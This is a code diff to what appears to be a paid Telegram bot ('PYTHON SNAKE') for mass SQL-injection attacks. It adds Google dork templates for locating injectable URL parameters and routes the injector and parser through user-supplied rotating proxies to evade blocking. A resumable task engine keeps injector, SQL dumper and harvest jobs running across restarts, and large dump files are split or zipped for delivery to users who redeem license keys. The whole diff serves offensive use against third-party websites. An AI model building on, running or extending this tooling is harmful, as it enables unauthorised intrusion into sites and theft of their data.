@@ -71,8 +71,8 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.20.0"
-BUILD = "keypool-dedupe"   # feature flags — /ping me dikhte hain
+VERSION = "v2.21.0"
+BUILD = "tasks-inbox-proxy"   # feature flags — /ping me dikhte hain
 BUILD_TS = "%s"                  # file load hone ka time (deploy check ke liye)
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
@@ -1448,6 +1448,35 @@ DORK_TEMPLATES = [
     'filetype:{e} inurl:{k}',
     'inurl:{f} intext:{k}',
     '"{f}" "{p}=" {t}',
+    'inurl:{f}?{p}=&{k}',
+    'inurl:{d}{p}=',
+    'intitle:{k} inurl:{p}=',
+    'allintext:{k} inurl:{f}',
+    'inurl:"{f}?{p}=" intext:{e}',
+    'site:{t} inurl:"{p}="',
+    'site:{t} intitle:{k}',
+    'site:{t} filetype:{e} intext:{k}',
+    'inurl:{f}?{p}= site:{t}',
+    'inurl:{d} intext:"{p}="',
+    'allinurl:{d}{f}',
+    'inurl:{f} ext:{e} intext:{k}',
+    'intitle:"{k}" intext:"{p}="',
+    'inurl:{p}= inurl:{f} ext:{e}',
+    '"{p}=" "{k}" site:{t}',
+    'inurl:{f}?{p}= "{k}"',
+    'allintitle:{k} filetype:{e}',
+    'site:{t} inurl:{d}{f}?{p}=',
+    'intext:"{p}=" ext:{e} site:{t}',
+    'inurl:{f} intitle:{k} site:{t}',
+    '"{f}?{p}=" {k}',
+    'inurl:{f} intext:"{k}" ext:{e}',
+    'allinurl:{f}?{p}= {k}',
+    'site:{t} "{p}="',
+    'inurl:{d}{f} intext:{k}',
+    'filetype:{e} intitle:{k} site:{t}',
+    'inurl:{f}?{p}= ext:{e} intext:{k}',
+    'intext:"{p}=" inurl:{f}?{p}=',
+    'intitle:{k} inurl:{d} ext:{e}',
 ]
 
 _SRC = ""
@@ -2057,21 +2086,34 @@ def make_dork(mode: str = "mixed", n: int = 50, niche: str = "", tld: str = "",
 
     # ── MIXED / HQ ────────────────────────────────────────────────────────────
     else:
+        # v2.21.0 — TSP ke 14 default templates mixed mode me hi lagte hain
+        # (alag section nahi). Random pick ki wajah se same keywords par bhi
+        # har run me naye dorks aate hain (freshness).
         tpls = DORK_TEMPLATES
+        _tsp = ("TSP_DORK_TYPES" in globals() and "tsp_render" in globals())
+        _tlds = globals().get("TSP_TLD_COMMON") or TLDS
+        rnd = random.Random((int(time.time() * 1000) ^ id(out)) & 0x7fffffff)
         i, stall = 0, 0
-        while not full() and stall < n * 4 + 5000:
+        while not full() and stall < n * 8 + 20000:
             before = len(out)
-            f = PAGE_FILES[i % len(PAGE_FILES)]
-            d = PAGE_DIRS[(i // 5) % len(PAGE_DIRS)]
-            p = prs[(i // 7) % len(prs)]
-            e = exts[(i // 11) % len(exts)]
-            k = words[(i // 13) % len(words)]
-            t = TLDS[(i // 17) % len(TLDS)]
-            tpl = tpls[i % len(tpls)]
-            try:
-                s2 = tpl.format(f=f, p=p, d=d, e=e, k=k, t=t)
-            except Exception:
-                s2 = "inurl:%s?%s=" % (f, p)
+            if _tsp and (i % 2):
+                s2 = tsp_render(rnd.choice(TSP_DORK_TYPES), rnd.choice(words),
+                                rnd.choice(_tlds), rnd.choice(TSP_PAGE_TYPES),
+                                rnd.choice(TSP_PAGE_FORMATS),
+                                rnd.choice(TSP_SEARCH_FUNCTIONS),
+                                rnd.randint(1, 999))
+            else:
+                f = rnd.choice(PAGE_FILES)
+                d = rnd.choice(PAGE_DIRS)
+                p = rnd.choice(prs)
+                e = rnd.choice(exts)
+                k = rnd.choice(words)
+                t = rnd.choice(TLDS)
+                tpl = rnd.choice(tpls)
+                try:
+                    s2 = tpl.format(f=f, p=p, d=d, e=e, k=k, t=t)
+                except Exception:
+                    s2 = "inurl:%s?%s=" % (f, p)
             add(s2)
             if len(out) == before:
                 stall += 1
@@ -3411,7 +3453,7 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
         return st
 
     _use_proxy = bool(proxy_available()) and inj_proxy_on()
-    rot = ProxyRotator(enabled=_use_proxy)
+    rot = ProxyRotator(enabled=_use_proxy, uid=uid)
     st["proxy"] = rot.stats()
     st["proxy_on"] = bool(rot.enabled and len(rot))
     workers = max(4, min(64, int(conc or 40)))
@@ -5355,8 +5397,19 @@ class ProxyRotator:
 
     COOLDOWN = 180.0
 
-    def __init__(self, pool=None, enabled: bool = True):
+    def __init__(self, pool=None, enabled: bool = True, uid=None):
         self.enabled = bool(enabled)
+        self.uid = int(uid or 0)
+        # v2.21.0 — user ka apna proxy (MY PROXY) sabse pehle try hota hai
+        self.upool = []
+        try:
+            if self.uid:
+                self.upool = list(user_proxy_pool(self.uid))
+                self.uon = bool(self.upool) and user_proxy_on(self.uid)
+            else:
+                self.uon = False
+        except Exception:
+            self.uon = False
         self.pool = []
         self.rot = set()
         for x in (pool if pool is not None else (PROXIES or load_proxy_pool())) or []:
@@ -5378,7 +5431,12 @@ class ProxyRotator:
         return sum(1 for p in self.pool if self.bad.get(p, 0) < now)
 
     def next(self):
-        """Agla proxy — rot endpoint pehle (har request naya IP), phir round robin."""
+        """Agla proxy — user ka apna pool pehle, phir rot endpoint, phir round robin."""
+        if getattr(self, "uon", False):
+            try:
+                return random.choice(self.upool)
+            except Exception:
+                pass
         if not self.enabled or not self.pool:
             return None
         now = time.time()
@@ -5407,7 +5465,8 @@ class ProxyRotator:
 
     def stats(self) -> dict:
         return {"pool": len(self.pool), "alive": self.alive(),
-                "used": self.used, "fail": self.fail}
+                "used": self.used, "fail": self.fail,
+                "mine": (len(self.upool) if getattr(self, "uon", False) else 0)}
 
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -5548,7 +5607,8 @@ def parse_budget() -> float:
 
 async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                      use_proxy=None, strict: bool = True,
-                     progress=None, mode: str = None, budget: float = 0) -> dict:
+                     progress=None, mode: str = None, budget: float = 0,
+                     uid=None) -> dict:
     """Har dork scan karo, junk hatao, aur poore stats do:
 
     scanned / raw / unique / errors / filtered / engines
@@ -5561,7 +5621,7 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
     mode = mode if mode in ENGINE_SETS else engines_mode()
     _px_mode0 = str(sget("parse_engine_proxy", "auto") or "auto")
     reset_engine_miss()                         # BUG 2 fix: naya scan = naya count
-    rot = ProxyRotator(enabled=bool(use_proxy))
+    rot = ProxyRotator(enabled=bool(use_proxy), uid=uid)
     eng_list = [e for e in engine_list(mode)
                 if (len(rot) or not use_proxy or e not in NO_PROXY_DEAD)]
     if not eng_list:
@@ -6156,7 +6216,60 @@ def trial_lock_on() -> bool:
     return bool(sget("trial_lock", 0))
 
 
+def _split_text_file(path: str, part_bytes: int = 12 * 1024 * 1024) -> list:
+    """Badi text file ko tukdon me todo (Telegram timeout se bachne ke liye)."""
+    parts, buf, size, idx = [], [], 0, 1
+    base = os.path.splitext(os.path.basename(path))[0]
+    out_dir = os.path.dirname(path) or DUMP_DIR
+    try:
+        with open(path, encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                b = len(line.encode("utf-8", "ignore"))
+                if size + b > part_bytes and buf:
+                    pp = os.path.join(out_dir, "%s_part%d.txt" % (base, idx))
+                    with open(pp, "w", encoding="utf-8") as g:
+                        g.writelines(buf)
+                    parts.append(pp)
+                    idx += 1
+                    buf, size = [], 0
+                buf.append(line)
+                size += b
+    except Exception:
+        return []
+    if buf:
+        pp = os.path.join(out_dir, "%s_part%d.txt" % (base, idx))
+        with open(pp, "w", encoding="utf-8") as g:
+            g.writelines(buf)
+        parts.append(pp)
+    return parts if len(parts) > 1 else []
+
+
+async def _send_doc(target, path, caption, tries=3):
+    """Ek file bhejo — lambi timeouts + retries (phone net slow ho to bhi)."""
+    name = os.path.basename(path)
+    waits = (60, 120, 180)[:max(1, tries)]
+    last = ""
+    for i, base_wait in enumerate(waits, 1):
+        try:
+            with open(path, "rb") as f:
+                await target.reply_document(
+                    document=f, filename=name, caption=str(caption)[:1000],
+                    read_timeout=base_wait + 60, write_timeout=base_wait + 120,
+                    connect_timeout=30, pool_timeout=30)
+            return True, ""
+        except Exception as exc:
+            last = "%s: %s" % (type(exc).__name__, str(exc)[:120])
+            logger.warning("send_file try %d fail (%s): %s", i, name, last)
+            await asyncio.sleep(1.5 * i)
+    return False, last
+
+
 async def send_file(update, path: str, caption: str = ""):
+    """File bhejo — badi file / slow net par bhi pahunchti hai.
+
+    v2.21.0: 3 retries (60/120/180s) → fail ho to file ke TUKDE → phir bhi fail
+    to zip. Timeout error ab kaam kharab nahi karta.
+    """
     try:
         uid = getattr(getattr(update, "effective_user", None), "id", 0)
         if trial_lock_on() and not access_ok(uid):
@@ -6169,46 +6282,508 @@ async def send_file(update, path: str, caption: str = ""):
     target = reply_msg(update)
     if target is None or not hasattr(target, "reply_document"):
         return False
-    name = os.path.basename(path)
-    for _try in (1, 2):                       # slow network — ek retry
+    if not path or not os.path.exists(path):
+        return False
+    size = os.path.getsize(path)
+    if size == 0:
+        return False
+    # 1) normal try — chhoti file turant
+    okk, err = await _send_doc(target, path, caption, tries=3 if size < 20 * 1024 * 1024 else 2)
+    if okk:
+        return True
+    # 2) badi text file → tukdon me bhejo
+    parts = []
+    if size > 2 * 1024 * 1024:
         try:
-            with open(path, "rb") as f:
-                await target.reply_document(document=f, filename=name,
-                                            caption=caption[:1000],
-                                            read_timeout=120, write_timeout=180)
+            parts = _split_text_file(path)
+        except Exception:
+            parts = []
+    if parts:
+        try:
+            await target.reply_text(
+                "📦 <b>File badi thi</b> — %d parts me bhej raha hoon (slow net par bhi "
+                "pahunch jayegi)." % len(parts), parse_mode=ParseMode.HTML)
+        except Exception:
+            pass
+        sent_any = True
+        for i, pp in enumerate(parts, 1):
+            p_ok, _e = await _send_doc(target, pp, "part %d/%d · %s"
+                                       % (i, len(parts), caption), tries=2)
+            sent_any = sent_any and p_ok
+            await asyncio.sleep(0.6)
+        if sent_any:
             return True
-        except Exception as exc:
-            logger.warning("send_file fail (try %d): %s", _try, exc)
-            if _try == 2:
-                try:
-                    await target.reply_text(
-                        "⚠️ <b>File send nahi hui</b>\n"
-                        "Reason: <code>%s</code>\n"
-                        "File phone me yahan bani hai:\n<code>%s</code>\n\n"
-                        "Dobara try karo — ya chhota count daalo."
-                        % (esc(str(exc)[:180]), esc(path)),
-                        parse_mode=ParseMode.HTML)
-                except Exception:
-                    pass
-                return False
+    # 3) zip fallback (badi file, tukde bhi fail)
+    if size > 1024 * 1024:
+        try:
+            import zipfile
+            zpath = os.path.splitext(path)[0] + ".zip"
+            with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
+                z.write(path, os.path.basename(path))
+            z_ok, _e = await _send_doc(target, zpath, "🗜 " + caption, tries=2)
+            if z_ok:
+                return True
+        except Exception:
+            pass
+    try:
+        await target.reply_text(
+            "⚠️ <b>File send nahi hui</b>\n"
+            "Reason: <code>%s</code>\n"
+            "File phone me yahan bani hai:\n<code>%s</code>\n\n"
+            "Dobara try karo — ya chhota count daalo." % (esc((err or "timeout")[:180]), esc(path)),
+            parse_mode=ParseMode.HTML)
+    except Exception:
+        pass
     return False
+
+
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  🗂 TASK ENGINE (v2.21.0)
+#  • Injector / Dumper / Parser ka bada kaam disk pe register hota hai.
+#  • Bot band ho jaye → on hone par wahi tasks KHUD resume (checkpoint se).
+#  • User kabhi bhi STOP kar sakta hai; /tasks se saari list + stop.
+# ═══════════════════════════════════════════════════════════════════════════════
+TASK_DIR = os.path.join(DATA_DIR, "tasks")
+try:
+    os.makedirs(TASK_DIR, exist_ok=True)
+except Exception:
+    pass
+TASKS = {}
+TASK_HANDLES = {}
+TASK_MAX_USER = 4                  # ek user ke queue me max tasks
+TASK_CONC = 4                      # poore bot me ek saath kitne tasks
+TASK_SEM = {"s": None}
+BOT_REF = {"app": None}
+TASK_KIND = {"inj": "💉 INJECTOR", "dump": "📥 SQL DUMPER",
+             "parse": "🔍 PARSER", "harvest": "🧲 HARVEST"}
+TASK_STATUS_ICON = {"queued": "🕒", "running": "▶️", "done": "✅",
+                    "stopped": "⛔", "error": "⚠️", "paused": "⏸"}
+
+
+def tasks_load() -> dict:
+    global TASKS
+    d = jload("tasks", {}) or {}
+    TASKS = d if isinstance(d, dict) else {}
+    return TASKS
+
+
+def tasks_save() -> None:
+    jsave("tasks", TASKS)
+
+
+def _task_payload_path(tid: str) -> str:
+    return os.path.join(TASK_DIR, "%s.txt" % re.sub(r"[^A-Za-z0-9_\-]", "", tid))
+
+
+def task_payload(tid: str) -> list:
+    try:
+        with open(_task_payload_path(tid), encoding="utf-8", errors="ignore") as f:
+            return [ln.rstrip("\n") for ln in f if ln.strip()]
+    except Exception:
+        return []
+
+
+def task_set_remaining(tid: str, items) -> int:
+    """Checkpoint — bachi hui list disk pe (crash/restart ke liye)."""
+    items = [str(x) for x in (items or []) if str(x).strip()]
+    p = _task_payload_path(tid)
+    try:
+        tmp = p + ".tmp"
+        with open(tmp, "w", encoding="utf-8") as f:
+            f.write("\n".join(items))
+            if items:
+                f.write("\n")
+        os.replace(tmp, p)
+    except Exception:
+        return 0
+    t = TASKS.get(tid)
+    if t is not None:
+        t["left"] = len(items)
+        t["updated"] = datetime.now().isoformat(timespec="seconds")
+        tasks_save()
+    return len(items)
+
+
+def task_new(kind: str, uid, items, extra=None, title: str = "") -> str:
+    """Naya task banao + payload disk pe. Returns task id."""
+    items = [str(x) for x in (items or []) if str(x).strip()]
+    tid = "t%s%s" % (int(time.time() * 1000) % 1000000000, random.randint(10, 99))
+    now = datetime.now().isoformat(timespec="seconds")
+    TASKS[tid] = {"id": tid, "uid": str(uid), "kind": kind,
+                  "title": (title or TASK_KIND.get(kind, kind))[:40],
+                  "status": "running", "created": now, "updated": now,
+                  "total": len(items), "left": len(items), "done": 0,
+                  "extra": extra or {}, "note": ""}
+    task_set_remaining(tid, items)
+    tasks_save()
+    logger.info("task %s start: %s • %d items • uid %s", tid, kind, len(items), uid)
+    return tid
+
+
+def task_get(tid: str) -> dict:
+    return TASKS.get(tid) or {}
+
+
+def task_update(tid: str, **kw) -> None:
+    t = TASKS.get(tid)
+    if not t:
+        return
+    t.update(kw)
+    t["updated"] = datetime.now().isoformat(timespec="seconds")
+    tasks_save()
+
+
+def task_finish(tid: str, status: str = "done", note: str = "") -> None:
+    t = TASKS.get(tid)
+    if not t:
+        return
+    if t.get("status") == "stopped" and status == "done":
+        status = "stopped"           # user ne roka — usi ko respect karo
+    t["status"] = status
+    t["note"] = str(note or "")[:200]
+    t["updated"] = datetime.now().isoformat(timespec="seconds")
+    if status in ("done", "stopped"):
+        t["left"] = 0
+        try:
+            os.remove(_task_payload_path(tid))
+        except Exception:
+            pass
+    tasks_save()
+    logger.info("task %s %s • %s", tid, status, t["note"])
+
+
+def task_stopped(tid: str) -> bool:
+    return (TASKS.get(tid) or {}).get("status") in ("stopped", "done")
+
+
+def tasks_of(uid) -> list:
+    return [t for t in TASKS.values() if str(t.get("uid")) == str(uid)]
+
+
+def tasks_active(uid) -> list:
+    return [t for t in tasks_of(uid) if t.get("status") in ("running", "queued")]
+
+
+def tasks_stop_uid(uid) -> int:
+    """User ke saare chalu tasks band (queued bhi hatao)."""
+    n = 0
+    for t in tasks_of(uid):
+        if t.get("status") in ("running", "queued"):
+            t["status"] = "stopped"
+            t["note"] = "stopped by user"
+            n += 1
+    if n:
+        tasks_save()
+    d = STOP_FLAGS.get(str(uid))
+    if d:
+        d["stop"] = True
+    return n
+
+
+def tasks_cleanup(days: int = 2) -> int:
+    """Purane done/stopped tasks hatao (disk saaf)."""
+    cut = time.time() - days * 86400
+    dead = []
+    for tid, t in list(TASKS.items()):
+        if t.get("status") not in ("running", "queued"):
+            try:
+                ts = datetime.fromisoformat(t.get("updated") or t.get("created")).timestamp()
+            except Exception:
+                ts = 0
+            if ts < cut:
+                dead.append(tid)
+    for tid in dead:
+        TASKS.pop(tid, None)
+    if dead:
+        tasks_save()
+    return len(dead)
+
+
+# ── Task UI (fake Telegram objects — resume ke waqt real update nahi hota) ──
+class _TaskUser:
+    def __init__(self, uid, name=""):
+        self.id = int(uid)
+        self.first_name = name or "user"
+        self.username = ""
+        self.mention_html = lambda *a, **k: self.first_name
+
+
+class _TaskMsg:
+    """Bot.send_message wrapper — reply_text / edit_text / reply_document."""
+
+    def __init__(self, bot, chat_id):
+        self.bot = bot
+        self.chat_id = chat_id
+        self.last_id = None
+
+    async def reply_text(self, text, **kw):
+        kw.pop("reply_markup", None) if False else None
+        kw.setdefault("parse_mode", ParseMode.HTML)
+        m = await self.bot.send_message(chat_id=self.chat_id, text=str(text)[:4096],
+                                        **{k: v for k, v in kw.items() if k != "reply_to_message_id"})
+        self.last_id = getattr(m, "message_id", None)
+        return m
+
+    async def edit_text(self, text, **kw):
+        if self.last_id:
+            try:
+                return await self.bot.edit_message_text(
+                    chat_id=self.chat_id, message_id=self.last_id, text=str(text)[:4096], **kw)
+            except Exception:
+                pass
+        return await self.reply_text(text, **kw)
+
+    async def reply_document(self, document=None, filename=None, caption="", **kw):
+        kw = {k: v for k, v in kw.items() if k in ("read_timeout", "write_timeout",
+                                                    "connect_timeout", "pool_timeout")}
+        return await self.bot.send_document(chat_id=self.chat_id, document=document,
+                                            filename=filename, caption=str(caption)[:1000],
+                                            **kw)
+
+
+class _TaskUpdate:
+    """Update jaisa object — bina Telegram ke."""
+
+    def __init__(self, bot, uid, name=""):
+        self.effective_user = _TaskUser(uid, name)
+        self.effective_chat = type("C", (), {"id": int(uid), "type": "private"})()
+        self.effective_message = _TaskMsg(bot, int(uid))
+        self.message = None
+        self.callback_query = None
+        self.real_uid = int(uid)
+        self.sink = []
+
+    def texts(self):
+        return []
+
+
+class _TaskCtx:
+    """Context jaisa object — user_data + bot."""
+
+    def __init__(self, bot, user_data=None, args=None):
+        self.bot = bot
+        self.user_data = dict(user_data or {})
+        self.chat_data = {}
+        self.bot_data = {}
+        self.args = list(args or [])
+
+
+def _task_notify(tid: str, text: str) -> None:
+    """Task owner ko seedha message (bot ke through)."""
+    t = TASKS.get(tid) or {}
+    app = BOT_REF.get("app")
+    if not app or not t:
+        return
+    async def _send():
+        try:
+            await app.bot.send_message(chat_id=int(t["uid"]), text=text[:4000],
+                                       parse_mode=ParseMode.HTML)
+        except Exception:
+            pass
+    return asyncio.create_task(_send())
+
+
+async def task_run(tid: str) -> None:
+    """Ek task chalao — inject / dump / parse / harvest."""
+    t = task_get(tid)
+    app = BOT_REF.get("app")
+    if not t or app is None:
+        return
+    if t.get("status") in ("done", "stopped", "error"):
+        return
+    sem = TASK_SEM.get("s")
+    if sem is None:
+        sem = asyncio.Semaphore(TASK_CONC)
+        TASK_SEM["s"] = sem
+    async with sem:
+        items = task_payload(tid)
+        if not items:
+            task_finish(tid, "done", "nothing left")
+            return
+        uid = t.get("uid")
+        task_update(tid, status="running", started=datetime.now().isoformat(timespec="seconds"))
+        upd = _TaskUpdate(app.bot, uid)
+        ctx = _TaskCtx(app.bot, {"_task_id": tid})
+        kind = t.get("kind")
+        try:
+            if kind == "inj":
+                ctx.user_data["inj_cat"] = (t.get("extra") or {}).get("cat", "all")
+                await _run_inject(upd, ctx, items, task_id=tid)
+            elif kind == "dump":
+                await _run_sqldump(upd, ctx, items,
+                                   (t.get("extra") or {}).get("targets") or {},
+                                   task_id=tid)
+            elif kind == "harvest":
+                await _run_dump(upd, ctx, items, task_id=tid)
+            elif kind == "parse":
+                ctx.user_data["parse_dorks"] = items
+                await input_deep_max(upd, ctx, "", task_id=tid)
+            # engine ne khud finish kiya ho (queued/stopped) to chhedo mat
+            if (task_get(tid) or {}).get("status") == "running":
+                task_finish(tid, "done")
+        except asyncio.CancelledError:
+            task_update(tid, status="queued", note="interrupted — next start par resume")
+            raise
+        except Exception as exc:
+            logger.exception("task %s fail: %s", tid, exc)
+            task_finish(tid, "error", str(exc)[:180])
+            _task_notify(tid, "⚠️ <b>Task ruk gaya</b>\n<code>%s</code>\n\n"
+                              "Kuch bhi lost nahi — /tasks se dobara chala sakte ho."
+                         % esc(str(exc)[:160]))
+        finally:
+            TASK_HANDLES.pop(tid, None)
+            try:
+                await tasks_reconcile()
+            except Exception:
+                pass
+
+
+def task_start(tid: str) -> bool:
+    """Task ko background me chalao (agar pehle se nahi chal raha)."""
+    if tid in TASK_HANDLES and not TASK_HANDLES[tid].done():
+        return False
+    try:
+        TASK_HANDLES[tid] = asyncio.create_task(task_run(tid))
+        return True
+    except RuntimeError:                 # koi running loop nahi (startup se pehle)
+        return False
+
+
+async def tasks_resume_all(delay: float = 6.0) -> int:
+    """Bot on hote hi adhoore tasks khud chalao."""
+    await asyncio.sleep(max(0.0, delay))
+    started = 0
+    for tid, t in list(TASKS.items()):
+        if t.get("status") in ("running", "paused"):
+            # crash hua tha — jo bacha hai wahi chalega
+            task_update(tid, status="queued", note="resumed after restart")
+    # per-user ek saath ek hi task (baaki queue me)
+    seen_uid = set()
+    for tid, t in sorted(TASKS.items(), key=lambda z: z[1].get("created") or ""):
+        if t.get("status") != "queued":
+            continue
+        uid = str(t.get("uid"))
+        if uid in seen_uid:
+            continue
+        seen_uid.add(uid)
+        if task_start(tid):
+            started += 1
+    if started:
+        logger.info("🔁 %d task(s) resume ho gaye", started)
+    return started
+
+
+async def tasks_reconcile() -> None:
+    """Task ke baad us user ka agla queued task chalao."""
+    done = [tid for tid, h in list(TASK_HANDLES.items()) if h.done()]
+    for tid in done:
+        TASK_HANDLES.pop(tid, None)
+    busy = {str((TASKS.get(t) or {}).get("uid")) for t, h in TASK_HANDLES.items()
+            if h and not h.done()}
+    for tid, t in sorted(TASKS.items(), key=lambda z: z[1].get("created") or ""):
+        if t.get("status") == "queued" and str(t.get("uid")) not in busy:
+            if task_start(tid):
+                busy.add(str(t.get("uid")))
+
+
+def tasks_card(uid) -> str:
+    mine = sorted(tasks_of(uid), key=lambda t: t.get("created") or "", reverse=True)[:10]
+    run = [t for t in mine if t.get("status") == "running"]
+    que = [t for t in mine if t.get("status") == "queued"]
+    head = (H("MY TASKS", "%d running • %d queued" % (len(run), len(que))) + "\n\n"
+            + P("Bot band ho jaye to bhi ye tasks on hote hi KHUD resume ho jate hain. "
+                "Yahan se kabhi bhi rok sakte ho.") + "\n")
+    if not mine:
+        return head + "\n" + B("Koi task nahi") + "\n" + P("Injector / Dumper / Parser chalao — "
+                                                           "task khud yahan aa jayega.")
+    lines = []
+    for t in mine:
+        icon = TASK_STATUS_ICON.get(t.get("status"), "•")
+        done = int(t.get("total", 0)) - int(t.get("left", 0))
+        pct = (100.0 * done / max(1, int(t.get("total", 1) or 1)))
+        lines.append("%s <b>%s</b> · <code>%s</code>\n"
+                     "   <i>%s/%s • %.0f%% • %s</i>%s"
+                     % (icon, esc(t.get("title") or TASK_KIND.get(t.get("kind"), "task")),
+                        t.get("id"),
+                        fmt(done), fmt(t.get("total", 0)), pct,
+                        esc(t.get("status", "")),
+                        ("\n   <i>%s</i>" % esc(t.get("note"))) if t.get("note") else ""))
+    return head + "\n" + "\n\n".join(lines)
+
+
+def kb_tasks(uid) -> InlineKeyboardMarkup:
+    rows = []
+    for t in sorted(tasks_active(uid), key=lambda z: z.get("created") or ""):
+        rows.append([InlineKeyboardButton("⛔ STOP %s" % TASK_KIND.get(t.get("kind"), "task"),
+                                          callback_data="tk:stop:%s" % t["id"])])
+    if rows:
+        rows.append([InlineKeyboardButton("⛔ STOP ALL", callback_data="tk:stopall")])
+    rows.append([InlineKeyboardButton("🧹 CLEAR FINISHED", callback_data="tk:clear")])
+    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
+    return RK(rows)
+
+
+async def cb_tasks(update, context):
+    uid = update.effective_user.id
+    txt = tasks_card(uid)
+    try:
+        await update.callback_query.edit_message_text(
+            txt, parse_mode=ParseMode.HTML, reply_markup=kb_tasks(uid))
+    except Exception:
+        pass
+
+
+async def cb_task_action(update, context, data: str):
+    uid = str(update.effective_user.id)
+    q = update.callback_query
+    act = data[3:] if data.startswith("tk:") else data
+    if act == "stopall":
+        n = tasks_stop_uid(uid)
+        try:
+            await q.answer("⛔ %d task(s) rok diye" % n, show_alert=False)
+        except Exception:
+            pass
+    elif act == "clear":
+        for tid, t in list(TASKS.items()):
+            if str(t.get("uid")) == uid and t.get("status") not in ("running", "queued"):
+                TASKS.pop(tid, None)
+        tasks_save()
+        try:
+            await q.answer("🧹 Saaf ho gaya", show_alert=False)
+        except Exception:
+            pass
+    elif act.startswith("stop:"):
+        tid = act[5:]
+        t = task_get(tid)
+        if t and str(t.get("uid")) == uid and t.get("status") in ("running", "queued"):
+            t["status"] = "stopped"
+            t["note"] = "stopped by user"
+            tasks_save()
+            d = STOP_FLAGS.get(uid)
+            if d:
+                d["stop"] = True
+            try:
+                await q.answer("⛔ Task roka", show_alert=False)
+            except Exception:
+                pass
+    try:
+        await q.edit_message_text(tasks_card(uid), parse_mode=ParseMode.HTML,
+                                  reply_markup=kb_tasks(uid))
+    except Exception:
+        pass
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
 #  KEYBOARDS
 # ═══════════════════════════════════════════════════════════════════════════════
 def kb_main(uid=0) -> InlineKeyboardMarkup:
+    #  v2.21.0: niches sirf HQ KEYWORDS → MY NICHES me (main menu saaf),
+    #  proxy engine sirf /admin me, aur 3 naye buttons (tasks/expand/support).
+    _act = len(tasks_active(uid))
     rows = [
         [InlineKeyboardButton(emo_btn("kw") + " HQ KEYWORDS", callback_data="m:kw")],
-    ]
-    nch = niche_list()
-    for i in range(0, len(nch), 2):
-        row = []
-        for nm in nch[i:i + 2]:
-            row.append(InlineKeyboardButton("🧩 %s" % nm[:18],
-                                            callback_data="nc:use:%d" % nch.index(nm)))
-        rows.append(row)
-    rows += [
         [InlineKeyboardButton(emo_btn("dork") + " DORKER", callback_data="m:dork"),
          InlineKeyboardButton(emo_btn("parse") + " PARSER", callback_data="m:parse")],
         [InlineKeyboardButton(emo_btn("rev") + " URL REVERSE", callback_data="m:rev"),
@@ -6216,11 +6791,14 @@ def kb_main(uid=0) -> InlineKeyboardMarkup:
         [InlineKeyboardButton(emo_btn("dump") + " DUMPER", callback_data="m:dump"),
          InlineKeyboardButton(emo_btn("qa") + " QUALITY CHECK", callback_data="m:qa")],
         [InlineKeyboardButton(emo_btn("rand") + " RANDOMIZER", callback_data="m:rand"),
+         InlineKeyboardButton("♻️ EXPAND", callback_data="m:expand")],
+        [InlineKeyboardButton("🗂 MY TASKS" + ((" (%d)" % _act) if _act else ""),
+                              callback_data="m:tasks"),
+         InlineKeyboardButton("🌐 MY PROXY", callback_data="m:myproxy")],
+        [InlineKeyboardButton("☎️ SUPPORT", callback_data="m:support"),
          InlineKeyboardButton(emo_btn("help") + " HELP", callback_data="m:help")],
         [InlineKeyboardButton("🔑 REDEEM KEY", callback_data="m:redeem")],
     ]
-    if is_admin(uid):
-        rows.append([InlineKeyboardButton("🧅 PROXY ENGINE (admin)", callback_data="m:proxy")])
     return RK(rows)
 
 
@@ -6688,6 +7266,10 @@ async def _on_callback_inner(update: Update, context: ContextTypes.DEFAULT_TYPE)
         if d and (str(uid) == str(t_uid) or is_admin(uid)):
             d["stop"] = True
             try:
+                tasks_stop_uid(t_uid)      # task record bhi band (resume na ho)
+            except Exception:
+                pass
+            try:
                 await q.answer("⛔ Stopping…", show_alert=False)
             except Exception:
                 pass
@@ -6773,6 +7355,28 @@ async def _on_callback_inner(update: Update, context: ContextTypes.DEFAULT_TYPE)
     # ── proxy sirf admin — user panel me kuch bhi na dikhe ──
     if data.startswith(("px:", "m:proxy")) and not is_admin(uid):
         return await show_home(update, uid)
+
+    # ── tasks / expand / user-proxy ──
+    if data.startswith("tk:"):
+        return await cb_task_action(update, context, data)
+    if data.startswith("ex:"):
+        if not access_ok(uid):
+            try:
+                await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
+                                          parse_mode=ParseMode.HTML)
+            except Exception:
+                pass
+            return
+        return await cb_expand(update, context, data[3:])
+    if data.startswith("upx:"):
+        if not access_ok(uid):
+            try:
+                await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
+                                          parse_mode=ParseMode.HTML)
+            except Exception:
+                pass
+            return
+        return await cb_myproxy(update, context, data[4:])
 
     # ── tool sub-buttons (dd / pr / rd / df / px / inj) ──
     if data.startswith(("dd:", "dp:", "pr:", "rd:", "df:", "px:", "inj:", "dk:")):
@@ -7453,10 +8057,13 @@ async def tool_dork(update, context):
            "⚡ <b>%s</b>\n   %s\n\n"
            "🚀 <b>%s</b>\n   %s\n\n"
            "%s\n\n"
+           "%s\n\n"
            "%s"
            % (B("DORKS GEN"), P("Count → Keywords → ready dorks"),
               B("DORKS GEN PRO"), P("Domains · Params · Filetypes · Templates · Combos"),
               KV("History", "<code>%s</code> dorks" % fmt(dork_seen_count()), "📚"),
+              P("TSP ke 14 templates ab har gen me default chalte hain — "
+                "alag TSP section ki zaroorat nahi."),
               P(VERSION)))
     try:
         await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=RK([
@@ -7465,7 +8072,6 @@ async def tool_dork(update, context):
             [InlineKeyboardButton("🏗 CMS DORKS", callback_data="dk:cms"),
              InlineKeyboardButton("📂 EXPOSED FILES", callback_data="dk:exp")],
             [InlineKeyboardButton("🌍 COUNTRY DORKS", callback_data="dp:country")],
-            [InlineKeyboardButton("🧰 TSP ENGINE (14 types)", callback_data="dk:tsp")],
